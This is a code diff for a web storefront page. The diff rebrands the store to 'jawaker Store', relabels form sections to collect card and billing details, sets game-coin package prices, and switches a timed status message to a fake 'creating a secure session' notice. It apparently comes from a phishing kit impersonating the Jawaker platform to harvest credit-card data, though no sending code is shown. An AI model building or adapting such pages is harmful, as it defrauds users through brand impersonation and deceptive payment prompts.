@@ -521,7 +521,7 @@
 
 <header>
   <div style="width:40px"></div>
-  <div class="brand">Parapayte Store <span class="dot">●</span></div>
+  <div class="brand">jawaker Store <span class="dot">●</span></div>
   <div class="menu-icon"><i></i><i></i><i></i></div>
 </header>
 
@@ -531,7 +531,7 @@
 </main>
 
 <footer>
-  <span>Parapayte Store</span>
+  <span>jawaker Store</span>
   <span>© 2026 جميع الحقوق محفوظة</span>
 </footer>
 
@@ -552,7 +552,7 @@
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label">الاسم وبعض المعلومات</div>
+      <div class="section-label"> معلومات البطاقة</div>
 
       <div class="field card-field">
         <input type="text" id="f-holder-name" name="jawakerName" placeholder="Card Holder Name" pattern="[^0-9]*" required>
@@ -569,7 +569,7 @@
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label">معلومات عنك</div>
+      <div class="section-label">معلومات الفواتير</div>
 
       <div style="display:flex; gap:10px;">
         <div class="field card-field" style="flex:1;">
@@ -634,13 +634,13 @@
   </svg>`;
 
   const packages = [
-    { name: "الفئة الأولى", amount: "120,000", price: "$10" },
-    { name: "الفئة الثانية", amount: "250,000", price: "$20" },
-    { name: "الفئة الثالثة", amount: "375,000", price: "$30" },
-    { name: "الفئة الرابعة", amount: "800,000", price: "$60" },
-    { name: "الفئة الخامسة", amount: "1,000,000", price: "$80" },
-    { name: "الفئة السادسة", amount: "1,300,000", price: "$100" },
-    { name: "الفئة السابعة", amount: "2,500,000", price: "$180" },
+    { name: "الفئة الأولى", amount: "130,000", price: "$10" },
+    { name: "الفئة الثانية", amount: "270,000", price: "$20" },
+    { name: "الفئة الثالثة", amount: "420,000", price: "$30" },
+    { name: "الفئة الرابعة", amount: "850,000", price: "$60" },
+    { name: "الفئة الخامسة", amount: "1,000,000", price: "$75" },
+    { name: "الفئة السادسة", amount: "1,350,000", price: "$100" },
+    { name: "الفئة السابعة", amount: "2,600,000", price: "$180" },
     { name: "الفئة الثامنة", amount: "3,500,000", price: "$250" },
   ];
 
@@ -660,7 +660,7 @@
 
   function handleBuy(btn){
     if(btn.dataset.state === 'price'){
-      btn.textContent = 'ادخل معلومات حسابك';
+      btn.textContent ='Pay with credit card';
       btn.dataset.state = 'pay';
       return;
     }
@@ -769,7 +769,7 @@
     clearTimeout(verifyTimer);
     verifyTimer = setTimeout(() => {
       if (statusView.classList.contains('show') && statusText.textContent === 'جار التحقق...') {
-        statusText.textContent = 'قيد المراجعة، سيتم إعلامك فور الانتهاء...';
+        statusText.textContent = 'جار إنشاء جلسة آمنة...';
       }
     }, 25000);
   }
